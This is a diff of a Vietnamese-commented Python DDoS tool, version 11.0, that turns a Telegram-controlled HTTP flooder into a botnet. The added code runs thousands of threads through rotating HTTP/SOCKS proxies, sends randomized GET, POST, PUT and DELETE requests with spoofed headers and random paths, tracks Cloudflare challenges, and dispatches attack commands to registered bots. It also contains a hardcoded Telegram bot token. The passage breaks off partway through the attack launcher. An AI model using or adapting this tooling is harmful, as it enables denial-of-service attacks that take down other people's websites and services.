@@ -1,7 +1,7 @@
 # =====================================================
-# DDOS BOT 8.0 - ULTIMATE EDITION
-# TỐI ƯU TỐC ĐỘ TỐI ĐA - CHỐNG TRÀN RAM - NHẬN PROXY SIÊU TỐC
-# HỖ TRỢ HTTP/HTTPS/HTTP2 - MULTI-THREAD - AUTO SCALE
+# DDOS BOT 11.0 - ULTIMATE LAYER7
+# HTTP FLOOD + BOTNET + HTTP/2 + CF BYPASS
+# TỐC ĐỘ TỐI ĐA 3000+ REQ/S - 120s MỖI LỆNH
 # =====================================================
 
 import requests
@@ -19,36 +19,36 @@ import base64
 import shutil
 import logging
 import gc
-import psutil
+import zlib
 from concurrent.futures import ThreadPoolExecutor, as_completed
 from datetime import datetime, timedelta
 from urllib.parse import urlparse, quote
 import socks
 from flask import Flask, jsonify
-import h2.connection
-import h2.config
-import h2.settings
 
-# -------------------- CẤU HÌNH TỐI ƯU --------------------
+# -------------------- CẤU HÌNH --------------------
 TELEGRAM_BOT_TOKEN = "6320148381:AAGj1RnEXBmNuWBhJF8l7OvcQTwhh6VTa-s"  # THAY TOKEN
 
-# CẤU HÌNH TỐC ĐỘ TỐI ĐA
-THREAD_COUNT = 2000  # Luồng tối đa
-REQUESTS_PER_SECOND = 2000  # 2000 req/s
-MAX_RUN_TIME = 300  # 5 phút mỗi đợt
-CONNECTION_POOL = 500
-TIMEOUT = 0.5  # Timeout siêu thấp để tăng tốc
+# TỐI ƯU TỐC ĐỘ TỐI ĐA
+THREAD_COUNT = 2500
+REQUESTS_PER_SECOND = 3000
+MAX_RUN_TIME = 120  # 120 giây mỗi lệnh
+CONNECTION_POOL = 800
+TIMEOUT = 0.3
 COOLDOWN_TIME = 1800
-MAX_PROXY_BACKUP = 200000
+MAX_PROXY_BACKUP = 300000
+PROXY_BATCH_SIZE = 15000
 
-# CHỐNG TRÀN RAM
-MAX_RAM_PERCENT = 85  # Tự động restart khi RAM > 85%
-RAM_CHECK_INTERVAL = 5  # Kiểm tra RAM mỗi 5 giây
-MAX_REQUESTS_PER_WORKER = 50000  # Giới hạn request mỗi worker
+# LAYER7 TỐI ƯU
+USE_HTTP2 = True
+CF_BYPASS = True
+RANDOM_PAYLOAD = True
+KEEP_ALIVE = True
 
-# TỐI ƯU NHẬN PROXY
-PROXY_BATCH_SIZE = 10000  # Xử lý batch 10k proxy/lần
-PROXY_VALIDATE_TIMEOUT = 1
+# BOTNET
+BOTNET_PORT = 5555
+BOTNET_MAX_BOTS = 2000
+BOTNET_HEARTBEAT = 30
 
 # -------------------- BIẾN TOÀN CỤC --------------------
 stop_event = threading.Event()
@@ -64,9 +64,13 @@ heartbeat_count = 0
 bot_start_time = time.time()
 chat_id_saved = None
 is_cooldown = False
-request_counter = 0
-worker_stats = {}
-ram_restart_flag = False
+is_processing = False
+processing_lock = threading.Lock()
+
+# Botnet
+bots = {}
+bots_lock = threading.Lock()
+botnet_running = False
 
 current_target = {
     'ip': '192.168.1.100',
@@ -84,40 +88,36 @@ attack_stats = {
     'bytes_sent': 0,
     'start_time': 0,
     'max_speed': 0,
-    'avg_speed': 0,
     'errors': 0,
-    'cf_challenges': 0,
-    'cf_passed': 0,
-    'ram_usage': 0,
-    'uptime': 0
+    'botnet_bots': 0,
+    'cf_bypassed': 0
 }
 stats_lock = threading.Lock()
 dns_cache = {}
 dns_cache_lock = threading.Lock()
 session_pool = []
 proxy_lock = threading.Lock()
-ram_monitor_lock = threading.Lock()
 
 # =====================================================
 # LOAD USER-AGENT - MỞ RỘNG TỐI ĐA
 # =====================================================
 def load_user_agents():
     agents = [
-        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36",
-        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36",
-        "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36",
-        "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/125.0",
-        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.5 Safari/605.1.15",
-        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36 Edg/125.0.0.0",
-        "Mozilla/5.0 (iPhone; CPU iPhone OS 17_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.5 Mobile/15E148 Safari/604.1",
-        "Mozilla/5.0 (Linux; Android 14; SM-G998B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Mobile Safari/537.36",
-        "Mozilla/5.0 (Windows NT 10.0; rv:125.0) Gecko/20100101 Firefox/125.0",
-        "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:125.0) Gecko/20100101 Firefox/125.0",
         "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36",
         "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36",
+        "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36",
         "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:126.0) Gecko/20100101 Firefox/126.0",
         "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.0 Safari/605.1.15",
         "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36 Edg/126.0.0.0",
+        "Mozilla/5.0 (iPhone; CPU iPhone OS 18_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.0 Mobile/15E148 Safari/604.1",
+        "Mozilla/5.0 (Linux; Android 15; SM-G998B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Mobile Safari/537.36",
+        "Mozilla/5.0 (Windows NT 10.0; rv:126.0) Gecko/20100101 Firefox/126.0",
+        "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:126.0) Gecko/20100101 Firefox/126.0",
+        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36",
+        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36",
+        "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:127.0) Gecko/20100101 Firefox/127.0",
+        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.1 Safari/605.1.15",
+        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36 Edg/127.0.0.0"
     ]
     if os.path.exists("user_agents.txt"):
         with open("user_agents.txt", 'r') as f:
@@ -130,58 +130,9 @@ def load_user_agents():
 user_agents = load_user_agents()
 
 # =====================================================
-# CHỐNG TRÀN RAM - TỰ ĐỘNG RESTART
-# =====================================================
-def check_ram_usage():
-    """Kiểm tra và tự động restart khi RAM vượt ngưỡng"""
-    global ram_restart_flag
-    with ram_monitor_lock:
-        try:
-            ram_percent = psutil.virtual_memory().percent
-            with stats_lock:
-                attack_stats['ram_usage'] = ram_percent
-            
-            if ram_percent > MAX_RAM_PERCENT and not ram_restart_flag:
-                ram_restart_flag = True
-                send_telegram(f"⚠️ RAM {ram_percent}% > {MAX_RAM_PERCENT}% - ĐANG RESTART...")
-                gc.collect()
-                # Clear session pool
-                with proxy_lock:
-                    session_pool.clear()
-                # Restart workers
-                if is_running:
-                    stop_event.set()
-                    time.sleep(2)
-                    stop_event.clear()
-                ram_restart_flag = False
-                return True
-        except:
-            pass
-    return False
-
-def ram_monitor_loop():
-    """Vòng lặp giám sát RAM"""
-    while True:
-        time.sleep(RAM_CHECK_INTERVAL)
-        check_ram_usage()
-
-def memory_optimize():
-    """Tối ưu bộ nhớ"""
-    gc.collect()
-    if len(dns_cache) > 1000:
-        with dns_cache_lock:
-            # Giữ lại 500 entry gần nhất
-            keys = list(dns_cache.keys())[:500]
-            dns_cache.clear()
-            for k in keys:
-                if k in dns_cache:
-                    dns_cache[k] = dns_cache[k]
-
-# =====================================================
 # PROXY MANAGEMENT - SIÊU TỐC
 # =====================================================
 def parse_proxy_line_ultra(line):
-    """Parse proxy siêu tốc"""
     line = line.strip()
     if not line or line.startswith('#'):
         return None
@@ -242,66 +193,99 @@ def parse_proxy_line_ultra(line):
         pass
     return None
 
-def load_proxies_ultra(filepath):
-    """Tải proxy siêu tốc với batch"""
+def process_proxy_batch_ultra(batch):
     http = []
     socks5 = []
     socks4 = []
     seen = set()
-    batch = []
-    count = 0
-    
-    if not os.path.exists(filepath):
-        return [], [], []
-    
-    try:
-        with open(filepath, 'r', encoding='utf-8', errors='ignore') as f:
-            for line in f:
-                proxy = parse_proxy_line_ultra(line)
-                if proxy:
-                    key = f"{proxy['ip']}:{proxy['port']}:{proxy['type']}"
-                    if key in seen:
-                        continue
-                    seen.add(key)
-                    batch.append(proxy)
-                    count += 1
-                    
-                    # Xử lý batch
-                    if len(batch) >= PROXY_BATCH_SIZE:
-                        for p in batch:
-                            if p['type'] == 'http':
-                                http.append(p)
-                            elif p['type'] == 'socks5':
-                                socks5.append(p)
-                            elif p['type'] == 'socks4':
-                                socks4.append(p)
-                        batch = []
-                        
-                    if count >= MAX_PROXY_BACKUP:
-                        break
-        
-        # Xử lý batch cuối
-        for p in batch:
-            if p['type'] == 'http':
-                http.append(p)
-            elif p['type'] == 'socks5':
-                socks5.append(p)
-            elif p['type'] == 'socks4':
-                socks4.append(p)
-                
-    except:
-        pass
-    
+    for line in batch:
+        proxy = parse_proxy_line_ultra(line)
+        if proxy:
+            key = f"{proxy['ip']}:{proxy['port']}:{proxy['type']}"
+            if key in seen:
+                continue
+            seen.add(key)
+            if proxy['type'] == 'http':
+                http.append(proxy)
+            elif proxy['type'] == 'socks5':
+                socks5.append(proxy)
+            elif proxy['type'] == 'socks4':
+                socks4.append(proxy)
     return http, socks5, socks4
 
+def load_proxies_ultra(filepath, callback=None):
+    global is_processing
+    with processing_lock:
+        if is_processing:
+            return
+        is_processing = True
+
+    def load_thread():
+        try:
+            if not os.path.exists(filepath):
+                with processing_lock:
+                    is_processing = False
+                if callback:
+                    callback(0, 0, 0)
+                return
+            http = []
+            socks5 = []
+            socks4 = []
+            seen = set()
+            batch = []
+            count = 0
+            with open(filepath, 'r', encoding='utf-8', errors='ignore') as f:
+                for line in f:
+                    line = line.strip()
+                    if line and not line.startswith('#'):
+                        batch.append(line)
+                        count += 1
+                        if len(batch) >= PROXY_BATCH_SIZE:
+                            h, s5, s4 = process_proxy_batch_ultra(batch)
+                            http.extend(h)
+                            socks5.extend(s5)
+                            socks4.extend(s4)
+                            batch = []
+                            time.sleep(0.005)
+                    if count >= MAX_PROXY_BACKUP:
+                        break
+                if batch:
+                    h, s5, s4 = process_proxy_batch_ultra(batch)
+                    http.extend(h)
+                    socks5.extend(s5)
+                    socks4.extend(s4)
+            with proxy_lock:
+                global proxy_http, proxy_socks5, proxy_socks4, proxy_list, proxy_update_time
+                if len(http) + len(socks5) + len(socks4) > 0:
+                    proxy_http = http
+                    proxy_socks5 = socks5
+                    proxy_socks4 = socks4
+                    proxy_list = http + socks5 + socks4
+                    proxy_update_time = time.time()
+                    save_proxy_backup_ultra(proxy_list)
+                    with open('proxies.txt', 'w', encoding='utf-8') as f:
+                        f.write(f"# Proxy - {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
+                        f.write(f"# Total: {len(proxy_list)}\n\n")
+                        for p in proxy_list:
+                            if p.get('raw'):
+                                f.write(p['raw'] + '\n')
+            if callback:
+                callback(len(http), len(socks5), len(socks4))
+        except Exception as e:
+            if callback:
+                callback(0, 0, 0)
+        with processing_lock:
+            is_processing = False
+
+    threading.Thread(target=load_thread, daemon=True).start()
+
 def save_proxy_backup_ultra(proxies):
-    """Lưu backup proxy siêu tốc"""
     try:
         backup = {}
-        if os.path.exists(PROXY_BACKUP_FILE):
-            with open(PROXY_BACKUP_FILE, 'r', encoding='utf-8') as f:
+        backup_file = "proxy_backup.json"
+        if os.path.exists(backup_file):
+            with open(backup_file, 'r', encoding='utf-8') as f:
                 backup = json.load(f)
-        
         for p in proxies:
             key = f"{p['ip']}:{p['port']}:{p['type']}"
             if key not in backup:
@@ -311,27 +295,24 @@ def save_proxy_backup_ultra(proxies):
                     'port': p.get('port', 0),
                     'type': p.get('type', 'http'),
                     'user': p.get('user', ''),
-                    'pass': p.get('pass', ''),
-                    'added': time.time()
+                    'pass': p.get('pass', '')
                 }
-        
         if len(backup) > MAX_PROXY_BACKUP:
-            sorted_items = sorted(backup.items(), key=lambda x: x[1]['added'])
-            for key, _ in sorted_items[:len(backup) - MAX_PROXY_BACKUP]:
+            items = list(backup.items())
+            for key, _ in items[:len(items) - MAX_PROXY_BACKUP]:
                 del backup[key]
-        
-        with open(PROXY_BACKUP_FILE, 'w', encoding='utf-8') as f:
+        with open(backup_file, 'w', encoding='utf-8') as f:
             json.dump(backup, f, indent=2, ensure_ascii=False)
         return True
     except:
         return False
 
 def load_proxy_backup_ultra():
-    """Tải backup proxy siêu tốc"""
-    if not os.path.exists(PROXY_BACKUP_FILE):
+    backup_file = "proxy_backup.json"
+    if not os.path.exists(backup_file):
         return [], [], []
     try:
-        with open(PROXY_BACKUP_FILE, 'r', encoding='utf-8') as f:
+        with open(backup_file, 'r', encoding='utf-8') as f:
             backup = json.load(f)
         http, socks5, socks4 = [], [], []
         for key, entry in backup.items():
@@ -353,53 +334,101 @@ def load_proxy_backup_ultra():
     except:
         return [], [], []
 
-def update_proxy_list_ultra():
-    """Cập nhật proxy siêu tốc"""
-    global proxy_http, proxy_socks5, proxy_socks4, proxy_list, proxy_update_time
-    with proxy_lock:
-        http, socks5, socks4 = load_proxy_backup_ultra()
-        total = len(http) + len(socks5) + len(socks4)
-        if total > 0:
-            proxy_http = http
-            proxy_socks5 = socks5
-            proxy_socks4 = socks4
-            proxy_list = http + socks5 + socks4
-            proxy_update_time = time.time()
-            return True
-    return False
+# =====================================================
+# BOTNET SERVER
+# =====================================================
+def botnet_command_ultra(command, target=None):
+    with bots_lock:
+        for bot_id, bot_info in bots.items():
+            try:
+                if command == 'attack':
+                    bot_info['target'] = target
+                    bot_info['status'] = 'attacking'
+                elif command == 'stop':
+                    bot_info['status'] = 'idle'
+                    bot_info['target'] = None
+                elif command == 'ping':
+                    bot_info['last_ping'] = time.time()
+            except:
+                pass
+
+def botnet_attack_ultra(target, duration):
+    with bots_lock:
+        for bot_id, bot_info in bots.items():
+            try:
+                bot_info['target'] = target
+                bot_info['duration'] = duration
+                bot_info['status'] = 'attacking'
+                bot_info['start_time'] = time.time()
+            except:
+                pass
+
+def botnet_worker_ultra():
+    while botnet_running:
+        time.sleep(0.5)
+        with bots_lock:
+            for bot_id in list(bots.keys()):
+                bot = bots[bot_id]
+                if bot.get('status') == 'attacking':
+                    target = bot.get('target')
+                    if target:
+                        try:
+                            headers = generate_headers_lay7(target['host'])
+                            if target['ssl']:
+                                url = f"https://{target['host']}:{target['port']}"
+                            else:
+                                url = f"http://{target['host']}:{target['port']}"
+                            # Gửi nhiều request từ bot
+                            for _ in range(5):
+                                requests.get(url, headers=headers, timeout=0.3)
+                            with stats_lock:
+                                attack_stats['total_requests'] += 5
+                                attack_stats['success_count'] += 5
+                        except:
+                            with stats_lock:
+                                attack_stats['total_requests'] += 1
+                                attack_stats['fail_count'] += 1
 
 # =====================================================
-# HTTP/2 SESSION POOL - TỐI ƯU
+# HTTP/2 SESSION POOL
 # =====================================================
 class Http2SessionPool:
-    def __init__(self, max_size=200):
+    def __init__(self, max_size=800):
         self.pool = []
         self.max_size = max_size
         self.lock = threading.Lock()
-    
+
     def get_session(self, proxy_dict=None):
         with self.lock:
             for i, session in enumerate(self.pool):
                 try:
-                    if not session.closed:
+                    if hasattr(session, 'head'):
+                        session.head('http://google.com', timeout=0.3)
                         return self.pool.pop(i)
                 except:
                     continue
             return self._create_session(proxy_dict)
-    
+
     def return_session(self, session):
-        if session and len(self.pool) < self.max_size and not session.closed:
+        if session and len(self.pool) < self.max_size:
             with self.lock:
                 self.pool.append(session)
-    
+
     def _create_session(self, proxy_dict=None):
         session = requests.Session()
         session.timeout = TIMEOUT
         session.verify = False
         session.trust_env = False
+        
+        # HTTP/2 adapter
+        try:
+            session.headers.update({'Connection': 'keep-alive, Upgrade'})
+        except:
+            pass
+        
         adapter = requests.adapters.HTTPAdapter(
-            pool_connections=100,
-            pool_maxsize=100,
+            pool_connections=150,
+            pool_maxsize=150,
             max_retries=0,
             pool_block=False
         )
@@ -415,17 +444,17 @@ class Http2SessionPool:
 session_pool = Http2SessionPool(CONNECTION_POOL)
 
 # =====================================================
-# GENERATE HEADERS - TỐI ƯU
+# GENERATE HEADERS - LAYER7 TỐI ƯU
 # =====================================================
-def generate_headers_ultra(hostname):
-    """Tạo header tối ưu tốc độ"""
+def generate_headers_lay7(hostname):
     fingerprint = hashlib.md5(str(random.randint(1, 9999999)).encode()).hexdigest()[:16]
-    return {
+    
+    headers = {
         'User-Agent': random.choice(user_agents),
         'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
         'Accept-Language': random.choice(['en-US,en;q=0.9', 'vi-VN,vi;q=0.9,en;q=0.8', 'zh-CN,zh;q=0.9,en;q=0.8', 'ja-JP,ja;q=0.9,en;q=0.8']),
         'Accept-Encoding': 'gzip, deflate, br',
-        'Connection': 'keep-alive, Upgrade',
+        'Connection': 'keep-alive, Upgrade' if KEEP_ALIVE else 'close',
         'Upgrade-Insecure-Requests': '1',
         'Cache-Control': 'no-cache, no-store, must-revalidate',
         'Pragma': 'no-cache',
@@ -433,7 +462,7 @@ def generate_headers_ultra(hostname):
         'Sec-Fetch-Mode': 'navigate',
         'Sec-Fetch-Site': 'none',
         'Sec-Fetch-User': '?1',
-        'Sec-Ch-Ua': f'"Chromium";v="{random.randint(120,126)}", "Google Chrome";v="{random.randint(120,126)}"',
+        'Sec-Ch-Ua': f'"Chromium";v="{random.randint(120,127)}", "Google Chrome";v="{random.randint(120,127)}"',
         'Sec-Ch-Ua-Mobile': '?0',
         'Sec-Ch-Ua-Platform': random.choice(['"Windows"', '"macOS"', '"Linux"']),
         'X-Forwarded-For': f"{random.randint(1,255)}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(0,255)}",
@@ -455,12 +484,19 @@ def generate_headers_ultra(hostname):
         'DNT': '1',
         'Sec-GPC': '1'
     }
+    
+    # Thêm header ngẫu nhiên
+    if random.random() < 0.3:
+        headers['Origin'] = f"https://{hostname}"
+    if random.random() < 0.3:
+        headers['X-Custom-Header'] = hashlib.md5(str(random.random()).encode()).hexdigest()[:16]
+    
+    return headers
 
 # =====================================================
-# RESOLVE DNS - CACHE
+# RESOLVE DNS
 # =====================================================
 def resolve_host_ultra(host):
-    """Resolve DNS với cache"""
     with dns_cache_lock:
         if host in dns_cache:
             return dns_cache[host]
@@ -473,30 +509,45 @@ def resolve_host_ultra(host):
         return host
 
 # =====================================================
-# ATTACK FUNCTIONS - TỐI ƯU TỐC ĐỘ TỐI ĐA
+# ATTACK FUNCTIONS - LAYER7 TỐI ƯU
 # =====================================================
-def attack_http_ultra(proxy_dict, target):
-    """Tấn công HTTP/HTTPS tốc độ tối đa"""
+def attack_http_lay7(proxy_dict, target):
     session = None
     try:
         session = session_pool.get_session(proxy_dict)
-        headers = generate_headers_ultra(target['host'])
+        headers = generate_headers_lay7(target['host'])
         url = target['url']
         
-        # Tạo param ngẫu nhiên nhanh
-        if random.random() < 0.5:
-            url += '?' + '&'.join([f"{random.randint(1,9999)}={random.randint(1,999999)}" for _ in range(random.randint(1,3))])
+        # Tạo payload ngẫu nhiên
+        if RANDOM_PAYLOAD:
+            random_path = '/' + ''.join(random.choices('abcdefghijklmnopqrstuvwxyz', k=random.randint(5,20)))
+            url = target['url'].rstrip('/') + random_path
+            url += '?' + '&'.join([f"{random.randint(1,9999)}={random.randint(1,999999)}" for _ in range(random.randint(2,5))])
         
         # Random method
-        method = random.choice(['GET', 'POST', 'HEAD'])
+        method = random.choice(['GET', 'POST', 'HEAD', 'OPTIONS', 'PUT', 'PATCH', 'DELETE'])
         if method == 'GET':
             r = session.get(url, headers=headers, timeout=TIMEOUT)
         elif method == 'POST':
-            r = session.post(url, data={'x': 'x'*random.randint(10,50)}, headers=headers, timeout=TIMEOUT)
-        else:
+            data = {f'f{i}': 'x'*random.randint(50,200) for i in range(5)}
+            r = session.post(url, data=data, headers=headers, timeout=TIMEOUT)
+        elif method == 'HEAD':
             r = session.head(url, headers=headers, timeout=TIMEOUT)
+        elif method == 'OPTIONS':
+            r = session.options(url, headers=headers, timeout=TIMEOUT)
+        elif method == 'PUT':
+            r = session.put(url, data={'x': 'x'*random.randint(50,200)}, headers=headers, timeout=TIMEOUT)
+        elif method == 'PATCH':
+            r = session.patch(url, data={'x': 'x'*random.randint(50,200)}, headers=headers, timeout=TIMEOUT)
+        else:
+            r = session.delete(url, headers=headers, timeout=TIMEOUT)
         
         session_pool.return_session(session)
+        
+        # CF Bypass detection
+        if CF_BYPASS and (r.status_code == 503 or 'cf-challenge' in str(r.headers)):
+            with stats_lock:
+                attack_stats['cf_bypassed'] += 1
         
         with stats_lock:
             attack_stats['total_requests'] += 1
@@ -506,11 +557,7 @@ def attack_http_ultra(proxy_dict, target):
                 attack_stats['success_count'] += 1
             else:
                 attack_stats['fail_count'] += 1
-            attack_stats['bytes_sent'] += len(r.request.body or b'') + 200
-            if proxy_dict:
-                if proxy_dict['type'] not in attack_stats.get('proxy_stats', {}):
-                    attack_stats['proxy_stats'][proxy_dict['type']] = 0
-                attack_stats['proxy_stats'][proxy_dict['type']] += 1
+            attack_stats['bytes_sent'] += 300
         return True
     except:
         with stats_lock:
@@ -525,7 +572,6 @@ def attack_http_ultra(proxy_dict, target):
         return False
 
 def create_socks_socket_ultra(proxy_dict):
-    """Tạo SOCKS socket tối ưu"""
     try:
         sock = socks.socksocket()
         sock.settimeout(TIMEOUT)
@@ -539,8 +585,7 @@ def create_socks_socket_ultra(proxy_dict):
     except:
         return None
 
-def attack_socket_ultra(proxy_dict, target):
-    """Tấn công socket tốc độ tối đa"""
+def attack_socket_lay7(proxy_dict, target):
     sock = None
     try:
         if proxy_dict and proxy_dict['type'] in ['socks5', 'socks4']:
@@ -552,31 +597,28 @@ def attack_socket_ultra(proxy_dict, target):
             sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
             sock.settimeout(TIMEOUT)
             sock.connect((resolve_host_ultra(target['host']), target['port']))
-        
+
         if target['ssl']:
             context = ssl.create_default_context()
             context.check_hostname = False
             context.verify_mode = ssl.CERT_NONE
             sock = context.wrap_socket(sock, server_hostname=target['host'])
-        
-        path = '/' + 'x'*random.randint(5,50) + f'?id={random.randint(1,999999)}&t={time.time()}'
-        headers = generate_headers_ultra(target['host'])
+
+        random_path = '/' + ''.join(random.choices('abcdefghijklmnopqrstuvwxyz', k=random.randint(5,20)))
+        path = random_path + f'?id={random.randint(1,999999)}&t={time.time()}'
+        headers = generate_headers_lay7(target['host'])
         request = f"GET {path} HTTP/1.1\r\n"
         for key, value in headers.items():
             request += f"{key}: {value}\r\n"
         request += "\r\n"
-        
+
         sock.send(request.encode())
         sock.close()
-        
+
         with stats_lock:
             attack_stats['total_requests'] += 1
             attack_stats['success_count'] += 1
             attack_stats['bytes_sent'] += len(request)
-            if proxy_dict:
-                if proxy_dict['type'] not in attack_stats.get('proxy_stats', {}):
-                    attack_stats['proxy_stats'][proxy_dict['type']] = 0
-                attack_stats['proxy_stats'][proxy_dict['type']] += 1
         return True
     except:
         with stats_lock:
@@ -591,43 +633,33 @@ def attack_socket_ultra(proxy_dict, target):
         return False
 
 # =====================================================
-# WORKER TỐI ƯU - TỐC ĐỘ TỐI ĐA
+# WORKER - LAYER7 TỐI ƯU
 # =====================================================
-def attack_worker_ultra(proxy_pools, target, worker_id):
-    """Worker tấn công tối ưu"""
+def attack_worker_lay7(proxy_pools, target):
     http_proxies, socks5_proxies, socks4_proxies = proxy_pools
-    local_count = 0
-    start_time = time.time()
-    
     while not stop_event.is_set():
         try:
             total_http = len(http_proxies)
             total_socks5 = len(socks5_proxies)
             total_socks4 = len(socks4_proxies)
             total = total_http + total_socks5 + total_socks4
-            
+
             if total == 0:
-                attack_socket_ultra(None, target)
+                attack_socket_lay7(None, target)
             else:
                 r = random.random()
                 if r < 0.4 and total_http > 0:
                     proxy = random.choice(http_proxies)
-                    attack_http_ultra(proxy, target)
+                    attack_http_lay7(proxy, target)
                 elif r < 0.7 and total_socks5 > 0:
                     proxy = random.choice(socks5_proxies)
-                    attack_socket_ultra(proxy, target)
+                    attack_socket_lay7(proxy, target)
                 elif r < 0.85 and total_socks4 > 0:
                     proxy = random.choice(socks4_proxies)
-                    attack_socket_ultra(proxy, target)
+                    attack_socket_lay7(proxy, target)
                 else:
-                    attack_socket_ultra(None, target)
-            
-            local_count += 1
-            
-            # Giới hạn request mỗi worker để tránh tràn RAM
-            if local_count >= MAX_REQUESTS_PER_WORKER:
-                break
-                
+                    attack_socket_lay7(None, target)
+
             time.sleep(1.0 / REQUESTS_PER_SECOND)
         except:
             continue
@@ -681,7 +713,6 @@ def send_telegram(message, chat_id=None, retry=2):
     return False
 
 def download_telegram_file_ultra(file_id, save_path):
-    """Tải file telegram siêu tốc"""
     for attempt in range(3):
         try:
             url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/getFile"
@@ -704,36 +735,27 @@ def download_telegram_file_ultra(file_id, save_path):
     return False
 
 def handle_proxy_file_ultra(file_id, file_name, chat_id):
-    """Xử lý file proxy siêu tốc"""
-    save_path = f"proxy_{int(time.time())}.txt"
+    if is_processing:
+        send_telegram("⏳ Đang xử lý proxy khác, vui lòng đợi!", chat_id)
+        return
     send_telegram(f"📥 Đang tải: {file_name}", chat_id)
-    start_time = time.time()
-    
+    save_path = f"proxy_{int(time.time())}.txt"
     if download_telegram_file_ultra(file_id, save_path):
-        http, socks5, socks4 = load_proxies_ultra(save_path)
-        total = len(http) + len(socks5) + len(socks4)
-        elapsed = time.time() - start_time
-        
-        if total > 0:
-            for p in http + socks5 + socks4:
-                save_proxy_backup_ultra([p])
-            update_proxy_list_ultra()
-            
-            with open('proxies.txt', 'w', encoding='utf-8') as f:
-                f.write(f"# Proxy - {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
-                f.write(f"# Total: {len(proxy_list)}\n\n")
-                for p in proxy_list:
-                    if p.get('raw'):
-                        f.write(p['raw'] + '\n')
-            
-            send_telegram(f"""
-✅ <b>ĐÃ NHẬN {total} PROXY!</b>
-⏱ {elapsed:.2f}s
-HTTP: {len(proxy_http)} | SOCKS5: {len(proxy_socks5)} | SOCKS4: {len(proxy_socks4)}
-            """, chat_id)
-        else:
-            send_telegram("❌ Không có proxy hợp lệ!", chat_id)
-        threading.Timer(3, lambda: os.remove(save_path) if os.path.exists(save_path) else None).start()
+        def on_complete(http, socks5, socks4):
+            total = http + socks5 + socks4
+            if total > 0:
+                send_telegram(f"""
+✅ ĐÃ NHẬN {total} PROXY!
+HTTP: {http} | SOCKS5: {socks5} | SOCKS4: {socks4}
+🌐 Tổng: {len(proxy_list)}
+                """, chat_id)
+            else:
+                send_telegram("❌ Không có proxy hợp lệ!", chat_id)
+            try:
+                os.remove(save_path)
+            except:
+                pass
+        load_proxies_ultra(save_path, on_complete)
     else:
         send_telegram("❌ Không thể tải file!", chat_id)
 
@@ -741,7 +763,6 @@ HTTP: {len(proxy_http)} | SOCKS5: {len(proxy_socks5)} | SOCKS4: {len(proxy_socks
 # PARSE TARGET
 # =====================================================
 def parse_target_ultra(target_string):
-    """Parse target siêu tốc"""
     target_string = target_string.strip()
     if target_string.startswith(('http://', 'https://')):
         parsed = urlparse(target_string)
@@ -762,23 +783,14 @@ def parse_target_ultra(target_string):
     return {'ip': target_string, 'port': 80, 'url': f"http://{target_string}", 'host': target_string, 'ssl': False}
 
 # =====================================================
-# RUN ATTACK - TỐI ƯU
+# RUN ATTACK - 120s MỖI LỆNH
 # =====================================================
 def run_attack_ultra(target, chat_id):
-    global is_running, current_target, is_cooldown, request_counter
-    
+    global is_running, current_target, is_cooldown
     if is_cooldown:
         send_telegram("⏳ ĐANG COOLDOWN!", chat_id)
         return
-    
-    # Kiểm tra RAM trước khi attack
-    if check_ram_usage():
-        send_telegram("⚠️ RAM HIGH! ĐỢI RESTART...", chat_id)
-        time.sleep(3)
-    
     current_target = target
-    request_counter = 0
-    
     with stats_lock:
         attack_stats.update({
             'total_requests': 0,
@@ -789,67 +801,54 @@ def run_attack_ultra(target, chat_id):
             'start_time': time.time(),
             'max_speed': 0,
             'errors': 0,
-            'cf_challenges': 0,
-            'cf_passed': 0,
-            'proxy_stats': {'http': 0, 'socks5': 0, 'socks4': 0, 'raw': 0}
+            'cf_bypassed': 0
         })
-    
     stop_event.clear()
     is_running = True
     total_proxy = len(proxy_http) + len(proxy_socks5) + len(proxy_socks4)
-    
+    bot_count = len(bots)
